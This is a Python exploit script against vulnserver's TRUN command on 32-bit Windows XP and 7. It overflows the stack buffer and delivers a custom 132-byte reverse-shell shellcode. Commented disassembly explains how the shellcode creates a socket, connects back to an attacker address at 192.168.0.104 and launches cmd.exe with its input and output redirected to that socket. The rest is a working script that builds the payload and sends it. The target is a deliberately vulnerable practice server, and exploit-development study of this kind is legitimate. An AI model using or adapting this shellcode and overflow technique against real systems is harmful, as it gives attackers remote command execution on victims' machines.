'''vulnserver TRUN buffer overflow shell
 using >> tiny custom reverse shell ( 132 bytes )
Tested on : Windows 7 32 bit, windows XP 32 bit SP3

Author : Goutham Madhwaraj (barriersec.com)
'''

import os
import socket
import sys


'''



payload : tiny reverse shell ( 132 bytes )

----------------------------------------------------------------
>> .\arwin.exe kernel32 CreateProcessA

CreateProcessA is located at 0x7c80236b in kernel32

>> .\arwin.exe ws2_32 WSASocketA

WSASocketA is located at 0x71ab8b6a in ws2_32

>> .\arwin.exe ws2_32 connect

connect is located at 0x71ab4a07 in ws2_32
-----------------------------------------------------------------


WSASocketA

"\x83\xEc\x20\x33\xC0\x50\x50\x50\xB3\x06\x53\xFE\xC0\x50\xFE\xC0\x50\x8B\xC2\xBB\x6A\x8B\xAB\x71\xFF\xD3\x8B\xF8" ( 28 bytes )


00B8FA21   83EC 20          SUB ESP,20
00B8FA24   33C0             XOR EAX,EAX
00B8FA26   50               PUSH EAX
00B8FA27   50               PUSH EAX
00B8FA28   50               PUSH EAX
00B8FA29   B3 06            MOV BL,6
00B8FA2B   53               PUSH EBX
00B8FA2C   FEC0             INC AL
00B8FA2E   50               PUSH EAX
00B8FA2F   FEC0             INC AL
00B8FA31   50               PUSH EAX
00B8FA32   8BC2             MOV EAX,EDX
00B8FA34   BB 6A8BAB71      MOV EBX,WS2_32.WSASocketA
00B8FA39   FFD3             CALL EBX
00B8FA3B   8BF8             MOV EDI,EAX


-------------------------------------------------------------------

connect :

#ipaddress - 192.168.0.104 ( attacker box ) #calculate and change it accordingly .

# 192 = C0(hex)
# 168 = A8(hex)
# 0 = 00 (hex)
# 104 = 68 ( hex )

so we have to push : 6800A8C0

since null : 
mov ebx,7911B9D1
sub ebx,11111111
push ebx

"\xBB\xD1\xB9\x11\x79\x81\xEB\x11\x11\x11\x11\x53\x66\xB8\x11\x5C\x66\x50\x33\xC0\xB0\x02\x66\x50\x8B\xD4\x6A\x16\x52\x57\xBB\x07\x4A\xAB\x71\xFF\xD3"  ( 37 bytes )

00B8FA3D   BB D1B91179      MOV EBX,7911B9D1 ( 6800ABC0 + 11111111 )
00B8FA42   81EB 11111111    SUB EBX,11111111
00B8FA48   53               PUSH EBX
00B8FA6D   66:B8 115C       MOV AX,5C11
00B8FA71   66:50            PUSH AX
00B8FA73   33C0             XOR EAX,EAX
00B8FA75   B0 02            MOV AL,2
00B8FA77   66:50            PUSH AX
00B8FA79   8BD4             MOV EDX,ESP
00B8FA7B   6A 16            PUSH 16
00B8FA7D   52               PUSH EDX
00B8FA7E   57               PUSH EDI
00B8FA4F   BB 074AAB71      MOV EBX,WS2_32.connect


00B8FA7F   FFD3             CALL EBX


-------------------------------------------------------------------------------

( 67 bytes )
BOOL CreateProcessA(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);

typedef struct _STARTUPINFOA {
  DWORD  cb;
  LPSTR  lpReserved;
  LPSTR  lpDesktop;
  LPSTR  lpTitle;
  DWORD  dwX;
  DWORD  dwY;
  DWORD  dwXSize;
  DWORD  dwYSize;
  DWORD  dwXCountChars;
  DWORD  dwYCountChars;
  DWORD  dwFillAttribute;
  DWORD  dwFlags;
  WORD   wShowWindow;
  WORD   cbReserved2;
  LPBYTE lpReserved2;
  HANDLE hStdInput;
  HANDLE hStdOutput;
  HANDLE hStdError;
}
so values has to be :
BOOL CreateProcessA(
  LPCSTR                lpApplicationName - NULL
  LPSTR                 lpCommandLine - pointer to "cmd"
  LPSECURITY_ATTRIBUTES lpProcessAttributes - NULL
  LPSECURITY_ATTRIBUTES lpThreadAttributes - NULL
  BOOL                  bInheritHandles - 1 (TRUE)
  DWORD                 dwCreationFlags - 0
  LPVOID                lpEnvironment - NULL
  LPCSTR                lpCurrentDirectory - NULL
  LPSTARTUPINFOA        lpStartupInfo - pointer  ( big one!! )
  LPPROCESS_INFORMATION lpProcessInformation - pointer ( junk )
);


first lets take care of pointers : 


#pointer to cmd(ECX)

"\xBA\x63\x63\x6D\x64\xC1\xEA\x08\x52\x8B\xCC\x83\xEC\x20\x8B\xDC" ( 16 bytes )

00B8FA62   BA 63636D64      MOV EDX,646D6363  #ddmc
00B8FA67   C1EA 08          SHR EDX,8
00B8FA6A   52               PUSH EDX
00B8FA6B   8BCC             MOV ECX,ESP

#pointer to processInformation ( can point to junk ) (EBX)
00B8FA6D   83EC 20          SUB ESP,20
00B8FA70   8BDC             MOV EBX,ESP


#pointer to lpStartupInfo

should contain values :

typedef struct _STARTUPINFOA {
  DWORD  cb - 0x44, size of structure
  LPSTR  lpReserved - NULL
  LPSTR  lpDesktop - NULL
  LPSTR  lpTitle - NULL
  DWORD  dwX - NULL
  DWORD  dwY - NULL
  DWORD  dwXSize - NULL
  DWORD  dwYSize - NULL
  DWORD  dwXCountChars - NULL
  DWORD  dwYCountChars - NULL
  DWORD  dwFillAttribute - NULL
  DWORD  dwFlags - STARTF_USESTDHANDLES 0x00000100
  WORD   wShowWindow - ignored
  WORD   cbReserved2 - NULL
  LPBYTE lpReserved2 - NULL
  HANDLE hStdInput - saved socket in EDI
  HANDLE hStdOutput - saved socket in EDI
  HANDLE hStdError - saved socket in EDI
}

"\x57\x57\x57\x33\xD2\x52\x52\x42\xC1\xC2\x08\x52\x33\xD2\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x80\xC2\x44\x52\x8B\xC4" ( 30 bytes )

00B8FA72   57               PUSH EDI
00B8FA73   57               PUSH EDI
00B8FA74   57               PUSH EDI
00B8FA75   33D2             XOR EDX,EDX
00B8FA77   52               PUSH EDX
00B8FA78   52               PUSH EDX
00B8FA79   42               INC EDX
00B8FA7A   C1C2 08          ROL EDX,8
00B8FA7D   52               PUSH EDX
00B8FA7E   33D2             XOR EDX,EDX
00B8FA80   52               PUSH EDX
00B8FA81   52               PUSH EDX
00B8FA82   52               PUSH EDX
00B8FA83   52               PUSH EDX
00B8FA84   52               PUSH EDX
00B8FA85   52               PUSH EDX
00B8FA86   52               PUSH EDX
00B8FA87   52               PUSH EDX
00B8FA88   52               PUSH EDX
00B8FA89   52               PUSH EDX
00B8FA8A   80C2 44          ADD DL,44
00B8FA8D   52               PUSH EDX
00B8FA8E   8BC4             MOV EAX,ESP

finally push the ProcessA and call the register


"\x53\x50\x33\xD2\x52\x52\x52\x42\x52\x4A\x52\x52\x51\x52\xBA\x6B\x23\x80\x7C\xFF\xD2" ( 21 bytes )

00B8FA90   53               PUSH EBX
00B8FA91   50               PUSH EAX
00B8FA92   33D2             XOR EDX,EDX
00B8FA94   52               PUSH EDX
00B8FA95   52               PUSH EDX
00B8FA96   52               PUSH EDX
00B8FA97   42               INC EDX
00B8FA98   52               PUSH EDX
00B8FA99   4A               DEC EDX
00B8FA9A   52               PUSH EDX
00B8FA9B   52               PUSH EDX
00B8FA9C   51               PUSH ECX
00B8FA9D   52               PUSH EDX
00B8FA9E   BA 6B23807C      MOV EDX,kernel32.CreateProcessA
00B8FAA3   FFD2             CALL EDX

'''



host= "192.168.0.101"
port= 9999


WSASocketA_call = "\x83\xEc\x20\x33\xC0\x50\x50\x50\xB3\x06\x53\xFE\xC0\x50\xFE\xC0\x50\x8B\xC2\xBB\x6A\x8B\xAB\x71\xFF\xD3\x8B\xF8"

connect_call = "\xBB\xD1\xB9\x11\x79\x81\xEB\x11\x11\x11\x11\x53\x66\xB8\x11\x5C\x66\x50\x33\xC0\xB0\x02\x66\x50\x8B\xD4\x6A\x16\x52\x57\xBB\x07\x4A\xAB\x71\xFF\xD3"

CreateProcessA_call = (

"\xBA\x63\x63\x6D\x64\xC1\xEA\x08\x52\x8B\xCC\x83\xEC\x20\x8B\xDC"
"\x57\x57\x57\x33\xD2\x52\x52\x42\xC1\xC2\x08\x52\x33\xD2\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x80\xC2\x44\x52\x8B\xC4"
"\x53\x50\x33\xD2\x52\x52\x52\x42\x52\x4A\x52\x52\x51\x52\xBA\x6B\x23\x80\x7C\xFF\xD2"


)

payload = (

)
buffer = 'TRUN .' +"A"*2006 + "\xaf\x11\x50\x62"+"\x90"*20+ WSASocketA_call + connect_call + CreateProcessA_call + "\xCC"*(351-len(WSASocketA_call) - len(connect_call) - len(CreateProcessA_call))+"\x90"*15+'\r\n'


conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
conn.connect((host,port))
print conn.recv(1024)
conn.send((buffer))
print conn.recv(1024)
conn.send('EXIT\r\n')
print conn.recv(1024)
conn.close()


